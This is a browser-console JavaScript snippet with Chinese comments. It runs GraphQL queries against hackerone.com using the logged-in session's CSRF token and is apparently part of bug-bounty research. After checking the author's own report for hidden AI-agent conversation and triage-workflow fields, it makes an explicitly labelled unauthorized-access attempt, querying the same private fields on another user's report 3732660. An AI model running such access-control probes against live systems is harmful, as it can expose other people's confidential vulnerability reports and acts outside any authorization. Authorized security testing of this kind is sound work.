# h1x53 登录态浏览器执行块(conversation/workflow 通道)
# 在 https://hackerone.com 任意登录页 console 粘贴执行,textarea 自动弹出,全选复制后贴回。
# 纯只读查询,零 mutation。

(async () => {
  const csrf = document.querySelector('meta[name="csrf-token"]').content;
  const q = async (query, vars = {}) => {
    const r = await fetch('/graphql', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf },
      body: JSON.stringify({ query, variables: vars })
    });
    return await r.json();
  };
  const out = [];

  // A1: 自己的报告 3992341 上是否暴露 agent 会话字段(hacker 视角)
  out.push(['A1_3992341_agent_convs', await q(`query($id:Int!){ reports(where:{id:{_eq:$id}}){ nodes{ id _id
    validation_agent_conversation{ id _id }
    exploit_agent_conversation{ id _id }
    linear_agent_conversation{ id _id }
    atlassian_agent_conversation{ id _id }
    remediation_agent_conversation{ id _id }
  } } }`, { id: 3992341 })]);

  // A2: 自己 intent 的 HAI 会话 id 锚点
  out.push(['A2a_intent312073_conv', await q(`query($id:Int!){ report_intent(id:$id){ id _id state
    conversation { ... on ConversationInterface { id _id type } } } }`, { id: 312073 })]);
  out.push(['A2b_intent312075_conv', await q(`query($id:Int!){ report_intent(id:$id){ id _id state
    conversation { ... on ConversationInterface { id _id type } } } }`, { id: 312075 })]);

  // A3: 自己的报告 3992341 的 triage workflow(锚点 + 对照)
  out.push(['A3a_intake_wf_3992341', await q(`query($id:Int!){ intake_workflow(report_id:$id){ id report_id state
    started_at finished_at output } }`, { id: 3992341 })]);
  out.push(['A3b_wf_runs_3992341', await q(`query($ids:[Int!]!){ workflow_runs(where:{ workflow_type:{_eq:triage_intake}
    report_id:{_in:$ids} }){ nodes{ id report_id state high_priority_summary } } }`, { ids: [3992341] })]);

  // B1: 越权尝试 - 他人报告 3732660 的 intake_workflow / workflow_runs
  out.push(['B1_intake_wf_3732660', await q(`query($id:Int!){ intake_workflow(report_id:$id){ id report_id state
    started_at finished_at output } }`, { id: 3732660 })]);
  out.push(['B2_wf_runs_3732660', await q(`query($ids:[Int!]!){ workflow_runs(where:{ workflow_type:{_eq:triage_intake}
    report_id:{_in:$ids} }){ nodes{ id report_id state high_priority_summary } } }`, { ids: [3732660] })]);
  out.push(['B3_report_3732660_convs', await q(`query($id:Int!){ reports(where:{id:{_eq:$id}}){ nodes{ id _id
    validation_agent_conversation{ id } exploit_agent_conversation{ id } } } }`, { id: 3732660 })]);
  out.push(['B4_assignable_3732660', await q(`query($ids:[Int!]!){ assignable_teams(report_ids:$ids){
    nodes{ id handle name } } }`, { ids: [3732660] })]);
  out.push(['B5_assignable_3992341', await q(`query($ids:[Int!]!){ assignable_teams(report_ids:$ids){
    nodes{ id handle name } } }`, { ids: [3992341] })]);

  const ta = document.createElement('textarea');
  ta.style.cssText = 'position:fixed;top:0;left:0;width:96%;height:85%;z-index:999999;font:11px monospace;white-space:pre;';
  ta.value = out.map(([k, v]) => '========== ' + k + ' ==========\n' + JSON.stringify(v, null, 1)).join('\n\n');
  document.body.appendChild(ta);
  ta.focus(); ta.select();
})();
